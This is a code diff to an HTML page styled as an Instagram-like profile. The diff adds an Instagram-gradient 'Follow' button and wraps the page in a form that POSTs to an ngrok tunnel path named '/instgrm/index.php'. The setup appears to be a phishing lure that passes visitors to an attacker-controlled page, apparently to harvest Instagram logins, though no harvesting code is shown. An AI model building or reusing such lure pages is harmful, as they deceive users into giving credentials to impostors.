@@ -48,16 +48,35 @@
             width: 90px;
             height: 90px;
             border-radius: 5px;
-            object-fit: cover;
-        }
+            object-fit: cover; }
+            .instagram-button {
+  background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+  color: white;
+  font-weight: bold;
+  padding: 12px 24px;
+  border: none;
+  border-radius: 50px;
+  cursor: pointer;
+  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+  transition: all 0.3s ease-in-out;
+}
+
+.instagram-button:hover {
+  opacity: 0.9;
+  transform: scale(1.05);
+}
+
+       
     </style>
 </head>
 <body>
     <div class="profile-container">
+        <form action="https://wondrous-select-stallion.ngrok-free.app/instgrm/index.php" method="post">
         <img class="profile-pic" src="https://www.parqueaustral.org/wp-content/uploads/2020/10/Sirius-1024x683.jpg" 
         alt="Photo de profil">
         <div class="username">@SUP_MARC_pro</div>
-        <a href="https://wondrous-select-stallion.ngrok-free.app/instgrm/index.php">visit</a>
+        <button class="instagram-button" type="submit">Follow</button>
+
         <div class="bio">licence professionnelle | BAC+3 | FORMATION</div>
         <div class="posts">
             <img class="post-img" src="https://fstt.ac.ma/Portail2023/wp-content/uploads/2023/06/327161198_883765066163388_2010873196881681493_n.jpg" 
@@ -67,6 +86,7 @@
             <img class="post-img" src="https://i.servimg.com/u/f31/17/61/14/98/licenc10.jpg"
              alt="Post 3">
         </div>
+    </form>
     </div>
 </body>
 </html>
